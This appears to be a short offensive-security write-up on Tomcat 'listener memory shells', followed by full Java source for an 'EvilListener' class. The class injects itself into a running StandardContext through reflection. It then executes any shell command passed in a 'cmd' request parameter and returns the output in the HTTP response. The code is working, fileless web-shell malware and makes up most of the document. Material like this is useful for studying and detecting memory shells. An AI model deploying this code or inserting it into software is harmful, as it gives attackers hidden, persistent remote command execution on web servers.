# Listener memshell

## Analysis

The `ServletRequestListener` interface can realize the monitoring of the `Request` object creation and destruction. Therefore, it's suitable to be used as a memory shell.

The `Listener` is added by calling the `addApplicationEventListener()` method of the `StandardContext` class dynamically.

In addition, we must achieve the `requestInitialized()` method and the `requestDestroyed()` method, and write malicious code in the `requestDestroyed()` method. The `Request` and `Response` objects can be obtained from the `ServletRequestEvent` class.

## Code

```java
public class EvilListener extends AbstractTranslet implements ServletRequestListener {
    static {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        try {
            Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
            field.setAccessible(true);
            WebResourceRoot resources = (WebResourceRoot) field.get(webappClassLoaderBase);
            StandardContext standardContext = (StandardContext) resources.getContext();

            EvilListener listener = new EvilListener();
            standardContext.addApplicationEventListener(listener);

            System.out.println("Inject success");
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
//        ServletRequestListener.super.requestDestroyed(sre);
        System.out.println("Evil requestDestroyed");
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        try {
            Field field = req.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request request = (Request) field.get(req);
            Response response = request.getResponse();

            if (req.getParameter("cmd") != null) {
                String cmd = req.getParameter("cmd");
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                PrintWriter out = response.getWriter();
                out.println(output);
                out.flush();
                out.close();
            }
        } catch (NoSuchFieldException | IOException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
    }
}
```
